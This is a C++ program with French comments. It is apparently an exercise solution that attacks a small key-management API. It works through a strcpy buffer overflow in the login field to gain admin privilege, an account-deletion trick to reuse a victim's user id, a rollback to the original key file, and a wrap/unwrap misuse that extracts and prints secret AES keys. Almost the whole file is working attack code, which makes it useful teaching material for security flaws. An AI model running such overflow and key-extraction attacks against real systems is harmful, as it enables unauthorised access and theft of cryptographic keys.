#include "aes.hpp"
#include "hmac.hpp"
#include "base64.hpp"
#include "api.hpp"

int main()
{
  /* Quelques tests pour vérifier que les modules fonctionnent */
  printf("AES\t test status: %d\n",AES::test());
  printf("SHA-256\t test status: %d\n",SHA256::test());
  printf("HMAC\t test status: %d\n",HMAC::test());
  printf("BASE64\t test status: %d\n",BASE64::test());


  // Je  garde une copie de la version d'origine des bases de données
  API::initFile("users_original.json","keys_original.json",1u);

  // et j'initialise deux autres fichiers que je vais modifier
  API::initFile("users_modifie.json","keys_modifie.json",1u);

  API *api = new API("users_modifie.json","keys_modifie.json");
  
  api->connectUser("admin","s3cr3t_p@ss");

  // Je demande à l'admin un compte utilisateur et il me fait un compte admin
  uint32_t user_id;
  api->newUser("this_is_a_login_having_max_size_\1","passwd",&user_id);

  // Ici j'exploite le bug de la ligne 11 du fichier user.cpp où on utilise la fonction strcpy et pas la version "sûre" strncpy. Comme on ne contrôle pas la taille de la chaîne entrée par l'utilisateur on peut effectuer un overflow et écrire au-delà de la zone délimitée par le tableau. En faisant un peu attention on arrive à modifier la valeur du champ privilège à 1 (c'est le sens du dernier caractère de la chaîne). Malheureusement, c'est "exploit" n'est pas reproductible à 100% car il dépend de l'organisation des éléments en mémoire qui est à la discrétion du compilateur.

  // Si ceci ne fonctionne pas sur votre PC, il faut faire la suite avec le compte admin.
  
  api->disconnect();

  // Je supprime le compte de benoit, et j'en créé un nouveau (vu la façon de choisir les identifiants, le nouveau compte récupèrera l'identifiant 2 convoité).

  api->connectUser("this_is_a_login_having_max_size_","passwd");
  api->deleteUser(2);
  api->deleteUser(3);

  api->newUser("this_is_a_login_having_max_size_\1","passwd",&user_id);
    
  api->disconnect();

  // Les modifications sont faites en mémoire durant l'exécution du programme et sont répercutées dans les fichiers uniquement à la suppression de l'instance api. Je supprime donc l'instance pour prendre en compte les modifications dans les fichiers .json
  delete api;

  // A ce moment, les clefs de benoit ont disparu et j'ai un compte avec un identifiant égal à 2 (dont je connais le mot de passe cette fois).

  // Je charge de nouveau l'API mais avec le fichier de clefs original car il n'y a pas d'intégrité temporelle. Je devrais donc récupérer les clefs appartenant à 2 (compte benoit à l'origine). Je vais pouvoir utiliser les clefs de benoit !
  api = new API("users_modifie.json","keys_original.json");
  api->connectUser("this_is_a_login_having_max_size_","passwd");
  
  // Ce qui suit a pour objectif de découvrir la valeur des clefs 1 et 2
  
  // On exporte la clef 2
  uint8_t buffer[16];
  size_t size = 16;
  api->wrap(1,2,buffer,&size);

  // On la réinjecte comme clef de wrapping.
  // Ceci ne devrait pas être faisable : on aurait du mettre les attributs de la clef dans les données exportées afin de ne pas avoir à les faire rentrer par l'utilisateur.
  uint32_t id_imp;
  api->unwrap(1,buffer,size,KEY_SYM,KEY_WRAP,2020,&id_imp);
  
  // On exporte maintenant la clef 1 à l'aide de la clef 2 importée
  api->wrap(id_imp,1,buffer,&size);

  // Et on déchiffre le résultat avec la clef 2
  api->decrypt(2,buffer,size);

  printf("clef 1: ");
  for ( unsigned i = 0 ; i < size ; i ++ )
    printf("%02x ",buffer[i]);
  printf("\n");
  
  // On fait la même chose pour la clef 2
  
  // On exporte la clef 2 à l'aide de la clef 2 importée
  api->wrap(id_imp,2,buffer,&size);

  // Et on déchiffre le résultat avec la clef 2
  api->decrypt(2,buffer,size);

  printf("clef 2: ");
  for ( unsigned i = 0 ; i < size ; i ++ )
    printf("%02x ",buffer[i]);
  printf("\n");
  
  // Pour la clef 2 on peut même vérifier que l'on a récupéré la bonne clef.
  uint8_t plaintext[16] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, ref[16];
  api->encrypt(2,plaintext,16);
  AES::decrypt(buffer,plaintext,ref);
  
  for ( unsigned i = 0 ; i < 16 ; i ++ )
    printf("%02x ",ref[i]);
  printf("\n");
  
  api->disconnect();
    
  return 0;
}
